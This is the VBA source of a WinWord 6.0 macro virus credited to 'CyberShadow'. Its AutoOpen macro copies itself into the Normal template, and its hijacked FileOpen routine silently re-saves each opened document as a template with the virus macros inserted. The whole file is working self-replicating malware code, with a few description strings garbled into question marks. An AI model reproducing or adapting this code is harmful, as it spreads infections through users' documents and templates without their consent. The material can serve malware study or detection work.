   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim c
   Dim i
    On Error GoTo -1: On Error GoTo ops
    c = 0
    For i = 1 To WordBasic.CountMacros(0, 0)
     If WordBasic.[MacroName$](i, 0, 0) = "CS" Then c = 10
    Next i
    If c = 10 Then GoTo ops
    Rem WinWord 6.0 Infector by CyberShadow...
    Rem Thanks to SGWW !
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:CS"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":CSF", "Normal:FileOpen"
   ops:
   End Sub

   Attribute VB_Name = "CSF"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ????????????? ????????? ??? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CSF.MAIN"
   Dim s
   Dim i
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    On Error GoTo -1: On Error GoTo ops
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    s = 100
    For i = 1 To WordBasic.CountMacros(1, 0, 0)
     If WordBasic.[MacroName$](i, 1) = "CSF" Then s = 1
    Next i
    If s = 1 Then GoTo ops
    Rem WinWord 6.0 Infector by CyberShadow...
    Rem Thanks to SGWW !
    WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
    WordBasic.MacroCopy "Normal:CS", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":CSF"
   ops:
   End Sub
